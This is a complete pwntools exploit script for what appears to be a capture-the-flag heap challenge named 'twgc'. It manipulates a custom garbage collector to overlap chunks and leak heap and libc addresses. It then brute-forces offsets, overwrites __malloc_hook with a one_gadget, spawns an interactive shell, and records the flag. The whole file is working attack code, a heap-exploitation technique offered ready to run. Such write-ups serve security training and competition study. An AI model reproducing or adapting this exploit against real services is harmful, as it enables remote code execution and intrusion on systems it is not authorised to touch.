#!/usr/bin/env python

from __future__ import print_function
from pwn import *

context.update(os='linux', arch='amd64',
	# log_level='debug',
)

elf = ELF('twgc')

def connect():
	return remote(args['HOST'] or 'localhost', args['PORT'] or 11419)

baby_max = 0x2000
chunk_header_size = 0x30

class Client:
	def __init__(self, t):
		self.t = t
		self.prompts = 1
		self.baby_size = 0x2000

	def baby_alloc(self, value_size):
		size = (value_size + chunk_header_size + 8) & ~0x7
		if self.baby_size + size > baby_max:
			log.debug('Baby GC should occur')
			self.baby_size = size
			return True
		else:
			self.baby_size += size
			return False

	def start_baby(self):
		log.debug('Size %d', self.baby_size)
		started = self.create('BEGIN', 'NOW')
		assert started
		self.rem_ref('root', 'BEGIN')

	def create(self, name, value):
		assert len(name) < 8
		assert len(value) < 0x200
		self.t.sendline('1')
		self.t.sendline(name)
		self.t.sendline(value)
		self.prompts += 1
		return self.baby_alloc(len(value))

	def edit(self, parent, child, value):
		self.t.sendline('2')
		self.t.sendline(parent)
		self.t.sendline(child)
		self.t.sendline(value)
		self.prompts += 1

	def add_ref(self, parent, child):
		self.t.sendline('3')
		self.t.sendline(parent)
		self.t.sendline(child)
		self.prompts += 1

	def rem_ref(self, parent, child):
		self.t.sendline('4')
		self.t.sendline(parent)
		self.t.sendline(child)
		self.prompts += 1

	def clean_prompts(self):
		while self.prompts > 0:
			self.t.recvuntil('exit\n>> ')
			self.prompts -= 1

	def show_var(self, parent, child):
		self.clean_prompts()
		self.t.sendline('5')
		self.t.sendline(parent)
		self.t.sendline(child)
		self.prompts += 1
		self.t.recvuntil('destination: ')
		result = self.t.recvuntil('\n1. Create string var', drop=True)
		return result

	def prepare_minor(self):
		if baby_max - self.baby_size > chunk_header_size:
			self.allocate_and_free(baby_max - self.baby_size)

	def allocate_and_free(self, to_allocate=0x2000):
		name = ''.join(random.choice(string.ascii_lowercase) for _ in xrange(6))
		while to_allocate > 0:
			current = max(8, min(0x1f0, to_allocate - chunk_header_size))
			if 0 < to_allocate - (current + chunk_header_size) < chunk_header_size + 8:
				current = to_allocate - 2 * chunk_header_size - 8
			self.create(name, 'a' * (current - 1))
			self.rem_ref('root', name)
			to_allocate -= current + chunk_header_size

	def run_minor(self, do_pause=False):
		self.prepare_minor()
		if do_pause: pause()
		self.start_baby()
		if do_pause: pause()

c = Client(connect())
c.start_baby()
c.create('old', '')

for _ in xrange(15):
	c.run_minor()

c.create('fst', 'a' * 7)
c.add_ref('old', 'fst')
c.rem_ref('root', 'fst')
c.create('snd', 'b' * 7)
c.add_ref('old', 'snd')
c.rem_ref('root', 'snd')
c.create('thd', 'c' * 7)
c.add_ref('old', 'thd')
c.rem_ref('root', 'thd')

# pause()

c.run_minor()
c.create('fst', 'd' * 0x17)
c.create('snd', 'e' * 0xf) # overlap refs with old->snd (now called old->'')
c.create('thd', 'f' * 7) # overlap mv with old->thd (now called old->(root->z->size))

heap_leak = u64(c.show_var('old', '').ljust(8, '\x00'))
log.info('Heap Leak %x', heap_leak)

c.run_minor()

mmap_base = u64(c.show_var('old', '\x08').ljust(8, '\x00')) - 0x88
assert mmap_base != 0
baby_base = mmap_base + 0x8000
log.info('Mmap base %x', mmap_base)
c.rem_ref('root', 'fst')
c.rem_ref('root', 'snd')
c.rem_ref('root', 'thd')

c.create('x', 'g' * 0x1f)
c.rem_ref('root', 'x')
c.create('y', 'h' * 0xf) # overlap refs with old->snd (now called old->'')
c.create('fref', flat(
	p64(0),
	p64(0) * 30,
))

fake_refs_addr = baby_base + 0x30 * 4 + 8 + 0x20 + 0x10
c.edit('old', '\x10', p64(0) + p64(fake_refs_addr).rstrip('\x00'))

c.edit('root', 'fref', flat(
	p64(1),
	p64(baby_base),
))
assert c.show_var('y', 'BEGIN') == 'NOW'

def try_offset(offset):
	heap_libc = (
		heap_leak
		+ 0x5576d395b910 - 0x5576d395adb0 
		+ 0x55773f306df0 - 0x55773f3070c0
		+ 0x56352d52edf0 - 0x56352d52edf0
		+ offset
	)
	log.info('Heap libc %x', heap_libc)

	# Get ready to read from heap_libc
	c.edit('root', 'fref', flat(
		p64(1),
		p64(heap_libc - 0x30 + 1),
	))
	result = c.show_var('y', '\x03')
	# c.edit('root', 'fref', flat(
	# 	p64(1),
	# 	p64(heap_libc - 0x30),
	# ))
	# result = c.show_var('y', p64(0x311))
	if result == 'Variable not found.':
		return False
	libc_leak = u64(result.rstrip('\x00').ljust(8, '\x00'))
	log.info('Leak %x', libc_leak)
	# libc_base = libc_leak - 0x00007f46412ecb78 + 0x7f4640f28000
	# log.info('Libc base %x', libc_base)
	return libc_leak

for offset in xrange(0, 0x1000, 0x10):
	for sign in [-1, 1]:
		libc_leak = try_offset(offset * sign)
		if libc_leak:
			break
	else:
		continue
	break

libc_base = (libc_leak << 8) - 0x00007f46412ecb78 + 0x7f4640f28000 - 0xf88 + 0x1000
log.info('Libc base %x', libc_base)

malloc_hook = libc_base + 0x7f2bdf16db10 - 0x7f2bdeda9000

log.info('Malloc hook %x', malloc_hook)
c.edit('root', 'fref', flat(
	p64(1),
	p64(malloc_hook - 0x30),
))
# c.edit('y', '', 'x' * 8)
c.edit('y', '', p64(libc_base + 0x4526a)) # one_gadget (rsp+0x30) == 0
c.create('1', '2')

c.t.interactive()

# TWCTF{1mp13m3nt3_s3cur3_GC_1s_t00_d1ff1cu1t}

